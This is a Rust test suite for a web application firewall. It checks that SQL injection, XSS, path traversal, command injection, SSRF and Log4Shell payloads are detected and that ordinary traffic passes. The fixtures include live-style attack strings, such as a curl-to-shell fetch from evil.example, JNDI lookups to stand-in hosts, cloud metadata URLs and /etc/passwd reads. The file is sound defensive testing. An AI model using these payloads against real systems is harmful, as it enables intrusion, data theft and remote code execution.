use super::*;
use crate::header::Header;
use crate::server::Address;

fn conn() -> ConnectionInfo {
    ConnectionInfo::new(Address { ip: "203.0.113.7".to_string(), port: 5555 }, Address { ip: "127.0.0.1".to_string(), port: 80 })
}

fn req(method: &str, uri: &str, headers: &[(&str, &str)], body: &str) -> Request {
    Request {
        method: method.to_string(),
        request_uri: uri.to_string(),
        http_version: "HTTP/1.1".to_string(),
        headers: headers.iter().map(|(n, v)| Header::new(n.to_string(), v.to_string())).collect(),
        body: body.as_bytes().to_vec().into(),
    }
}

fn verdict(waf: &Waf, value: &str) -> Verdict {
    let q = value.replace('%', "%25").replace('&', "%26").replace('#', "%23").replace('+', "%2B").replace(' ', "+");
    waf.inspect(&req("GET", &format!("/search?q={q}"), &[], ""), &conn())
}

/// Payloads from real attacks and the OWASP CRS regression tests' families.
const ATTACKS: &[(&str, u32)] = &[
    ("' or '1'='1", 942100),
    ("1' or 1=1-- -", 942100),
    ("admin'--", 942110),
    ("x\") or (\"a\"=\"a", 942100),
    ("' || 'x' like 'x", 942100),
    ("1 union select username, password from users", 942120),
    ("-1 UNION ALL SELECT NULL,NULL,@@version", 942120),
    ("1 un/**/ion se/**/lect 1", 0), // split keywords stay harmless as SQL
    ("1 union/**/select 1,2", 942120),
    ("1%20UNION%20SELECT%201", 942120),
    ("1; drop table users", 942130),
    ("1'; exec xp_cmdshell 'dir'--", 942110),
    ("1 and sleep(5)", 942140),
    ("1) or benchmark(1000000,md5(1))#", 942140),
    ("1'; waitfor delay '0:0:5'--", 942140),
    ("1 and 1=(select count(*) from information_schema.tables)", 942150),
    ("1 or 1=1", 942160),
    ("<script>alert(1)</script>", 941100),
    ("<ScRiPt src=//evil.example/x.js></script>", 941100),
    ("<img src=x onerror=alert(1)>", 941110),
    ("\" onmouseover=\"alert(document.cookie)", 941110),
    ("<svg/onload=alert(1)>", 941110),
    ("&lt;script&gt;alert(1)&lt;/script&gt;", 941100),
    ("&#60;img src=x onerror=alert(1)&#62;", 941110),
    ("javascript:alert(1)", 941120),
    ("java\tscript:alert(1)", 941120),
    ("<a href=\"javascript:alert(1)\">x</a>", 941120),
    ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", 941120),
    ("<iframe src=//evil.example>", 941130),
    ("<div style=\"width: expression(alert(1))\">", 941140),
    ("../../../../etc/passwd", 930100),
    ("..%2f..%2f..%2fetc%2fpasswd", 930100),
    ("%252e%252e%252f%252e%252e%252fetc%252fshadow", 930100),
    ("/var/www/../../etc/passwd", 930110),
    ("C:\\Windows\\win.ini", 930110),
    ("../.env", 930110),
    ("php://filter/convert.base64-encode/resource=index.php", 931100),
    ("file:///etc/passwd", 931100),
    ("expect://id", 931100),
    ("x; cat /etc/passwd", 932100),
    ("127.0.0.1 | id", 932100),
    ("`whoami`", 932100),
    ("$(curl evil.example/x.sh | sh)", 932100),
    ("a;${IFS}cat${IFS}/etc/passwd", 932110),
    ("http://169.254.169.254/latest/meta-data/iam/", 934100),
    ("http://metadata.google.internal/computeMetadata/v1/", 934100),
    ("${jndi:ldap://evil.example/a}", 944100),
    ("${${lower:j}${lower:n}${lower:d}i:ldap://evil.example/a}", 944100),
    ("${${::-j}${::-n}${::-d}${::-i}:rmi://evil.example/a}", 944100),
    ("${${env:NOPE:-j}ndi${env:NOPE:-:}ldap://evil.example}", 944100),
];

/// Ordinary traffic that must pass at paranoia 1.
const BENIGN: &[&str] = &[
    "O'Reilly",
    "Dave's \"best\" pizza -- delivered",
    "rock'n'roll",
    "select a product from the list",
    "Union Station, Chicago",
    "the union of two sets",
    "1 or 2 items",
    "salt & pepper; to taste",
    "cats | dogs",
    "C# and F# developers",
    "a-b-c -- d",
    "email@example.com",
    "https://example.com/path?x=1&y=2",
    "Learn JavaScript: the good parts",
    "on the road again",
    "I <3 rws",
    "x < y and y > z",
    "price >= 10 and price <= 20",
    "2024-01-01T00:00:00Z",
    "../relative/link",
    "SELECT is my favourite button label",
    "Drop me a line; I'll reply",
    "sleep well tonight",
    "/api/v1/users/42/orders?status=open",
    "{\"name\":\"Ann\",\"tags\":[\"a\",\"b\"]}",
    "Tom & Jerry's #1 fan",
    "ls -la is a command you can run",
    "rated 1 or 2 stars",
    "AND/OR logic gates",
    "sh-boom by the Chords",
    "one; two; three",
    "<b>bold</b> text",
    "the onboarding = done",
    "conversion=12%",
    "We'll meet at the cat café",
    "SSO via OIDC; see ${docs}",
];

#[test]
fn attacks_are_caught_at_paranoia_1() {
    let waf = Waf::new(WafConfig::default());
    let mut missed = Vec::new();
    for (payload, expected) in ATTACKS {
        let v = verdict(&waf, payload);
        let ids = v.rule_ids();
        if *expected == 0 {
            continue;
        }
        if !ids.contains(expected) || v.score < 5 {
            missed.push(format!("{payload:?} → {ids:?} (expected {expected})"));
        }
    }
    assert!(missed.is_empty(), "missed:\n{}", missed.join("\n"));
}

#[test]
fn ordinary_traffic_passes_at_paranoia_1() {
    let waf = Waf::new(WafConfig::default());
    let flagged: Vec<String> = BENIGN.iter().filter_map(|b| {
        let v = verdict(&waf, b);
        (v.score >= 5).then(|| format!("{b:?} → {:?}", v.matches))
    }).collect();
    assert!(flagged.is_empty(), "false positives:\n{}", flagged.join("\n"));
}

#[test]
fn bodies_cookies_and_headers_are_inspected() {
    let waf = Waf::new(WafConfig::default());
    let form = req("POST", "/login", &[("Content-Type", "application/x-www-form-urlencoded")], "user=admin%27--&pass=x");
    assert!(waf.inspect(&form, &conn()).rule_ids().contains(&942110));
    let json = req("POST", "/api", &[("Content-Type", "application/json")], r#"{"comment":"<script>alert(1)<\/script>","n":1}"#);
    assert!(waf.inspect(&json, &conn()).rule_ids().contains(&941100));
    let multipart = req(
        "POST",
        "/upload",
        &[("Content-Type", "multipart/form-data; boundary=XY")],
        "--XY\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\n' or '1'='1\r\n--XY\r\nContent-Disposition: form-data; name=\"f\"; filename=\"../../etc/passwd\"\r\n\r\n<script>file content isn't inspected</script>\r\n--XY--\r\n",
    );
    let ids = waf.inspect(&multipart, &conn()).rule_ids();
    assert!(ids.contains(&942100) && ids.contains(&930100) && !ids.contains(&941100), "{ids:?}");
    let cookie = req("GET", "/", &[("Cookie", "session=abc; pref=<svg/onload=alert(1)>")], "");
    assert!(waf.inspect(&cookie, &conn()).rule_ids().contains(&941110));
    let log4j = req("GET", "/", &[("X-Api-Version", "${jndi:ldap://evil.example/a}")], "");
    assert!(waf.inspect(&log4j, &conn()).rule_ids().contains(&944100));
    let scanner = req("GET", "/", &[("User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")], "");
    assert!(waf.inspect(&scanner, &conn()).rule_ids().contains(&913100));
    let path = req("GET", "/static/..%2f..%2f..%2fetc/passwd", &[], "");
    assert!(waf.inspect(&path, &conn()).score >= 5);
    // A browser's ordinary request.
    let browser = req("GET", "/products?category=shoes&sort=price&page=2", &[("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36"), ("Cookie", "_ga=GA1.2.3; cart=7f3a"), ("Referer", "https://shop.example/")], "");
    assert_eq!(waf.inspect(&browser, &conn()).score, 0);
}

#[test]
fn too_many_arguments() {
    let waf = Waf::new(WafConfig { max_args: 10, ..WafConfig::default() });
    let query: Vec<String> = (0..11).map(|i| format!("a{i}=1")).collect();
    assert!(waf.inspect(&req("GET", &format!("/?{}", query.join("&")), &[], ""), &conn()).rule_ids().contains(&920100));
}

#[test]
fn paranoia_turns_on_stricter_rules() {
    let pl1 = Waf::new(WafConfig::default());
    let pl3 = Waf::new(WafConfig { paranoia: 3, ..WafConfig::default() });
    assert!(verdict(&pl1, "<b>bold</b>").matches.is_empty());
    assert!(verdict(&pl3, "<b>bold</b>").rule_ids().contains(&941300));
    let pl2 = Waf::new(WafConfig { paranoia: 2, ..WafConfig::default() });
    assert!(verdict(&pl2, "select name from people").rule_ids().contains(&942200));
    assert!(!verdict(&pl1, "select name from people").rule_ids().contains(&942200));
}

#[test]
fn exclusions_switch_rules_off_for_a_path() {
    let waf = Waf::new(WafConfig { exclude: vec![Exclusion::parse("941*@/cms/"), Exclusion::parse("942100")], ..WafConfig::default() });
    assert!(waf.inspect(&req("GET", "/cms/save?html=%3Cscript%3Ex%3C/script%3E", &[], ""), &conn()).matches.is_empty());
    assert!(!waf.inspect(&req("GET", "/other?html=%3Cscript%3Ex%3C/script%3E", &[], ""), &conn()).matches.is_empty());
    assert!(!verdict(&waf, "' or '1'='1").rule_ids().contains(&942100));
}

#[test]
fn custom_rules_deny_allow_log_and_score() {
    let rules = vec![
        CustomRule { id: 1001, field: Field::Path, contains: vec![], prefix: vec!["/wp-login".into()], equals: vec![], cidr: vec![], action: Action::Deny },
        CustomRule { id: 1002, field: Field::Ip, contains: vec![], prefix: vec![], equals: vec![], cidr: vec!["10.0.0.0/8".into()], action: Action::Allow },
        CustomRule { id: 1003, field: Field::Header("x-debug".into()), contains: vec!["1".into()], prefix: vec![], equals: vec![], cidr: vec![], action: Action::Score(5) },
        CustomRule { id: 1004, field: Field::Arg("q".into()), contains: vec![], prefix: vec![], equals: vec!["test".into()], cidr: vec![], action: Action::Log },
    ];
    let waf = Waf::new(WafConfig { rules, ..WafConfig::default() });
    assert!(waf.inspect(&req("GET", "/wp-login.php", &[], ""), &conn()).denied);
    let mut inside = conn();
    inside.client.ip = "10.1.2.3".into();
    let v = waf.inspect(&req("GET", "/?q=%3Cscript%3E", &[], ""), &inside);
    assert!(v.allowed && v.matches.is_empty());
    assert_eq!(waf.inspect(&req("GET", "/", &[("X-Debug", "1")], ""), &conn()).score, 5);
    let v = waf.inspect(&req("GET", "/?q=TEST", &[], ""), &conn());
    assert_eq!((v.score, v.rule_ids()), (0, vec![1004]));
}

#[test]
fn the_layer_blocks_detects_or_passes() {
    use crate::test_client::TestClient;
    use crate::core::New;
    let app = || crate::app::App::new();
    let block = TestClient::new(crate::middleware::WithMiddleware::new(app()).wrap(WafLayer::new(WafConfig::default())));
    let res = block.get("/?q=%27+or+%271%27%3D%271").send();
    assert_eq!(res.status(), 403);
    assert!(res.body_text().contains("942100"), "{}", res.body_text());
    let detect = TestClient::new(crate::middleware::WithMiddleware::new(app()).wrap(WafLayer::new(WafConfig { mode: Mode::Detect, ..WafConfig::default() })));
    assert_ne!(detect.get("/?q=%27+or+%271%27%3D%271").send().status(), 403);
    assert_ne!(block.get("/?q=shoes").send().status(), 403);
    assert!(prometheus_text().contains("rws_waf_requests_total{action=\"blocked\"}"));
}

#[test]
fn decoding_undoes_the_usual_encodings() {
    assert_eq!(decode::normalize("%3CScRiPt%3E"), "<script>");
    assert_eq!(decode::normalize("%253Cscript%253E"), "<script>");
    assert_eq!(decode::normalize("&#x3c;&#60&lt;&quot;"), "<<<\"");
    assert_eq!(decode::normalize("\\x3cscript\\u003e"), "<script>");
    assert_eq!(decode::normalize("UN/**/ION/*!50000SELECT*/"), "un ion ");
    assert_eq!(decode::normalize("a\u{0}b\t\n  c"), "ab c");
    assert_eq!(decode::normalize("%u003cimg"), "<img");
    fuzz::inspect(b"%%%u12&#x;\\u12${${lower:${::-j}");
}

#[test]
fn a_request_without_matches_is_fast() {
    let waf = Waf::new(WafConfig::default());
    let r = req("GET", "/products?category=shoes&sort=price&page=2&q=red+running+shoes", &[("User-Agent", "Mozilla/5.0"), ("Cookie", "a=1; b=2")], "");
    let start = std::time::Instant::now();
    for _ in 0..1000 {
        assert_eq!(waf.inspect(&r, &conn()).score, 0);
    }
    let per = start.elapsed() / 1000;
    // Generous for debug builds on slow runners; release is ~10× faster.
    assert!(per < std::time::Duration::from_micros(500), "{per:?} per request");
}
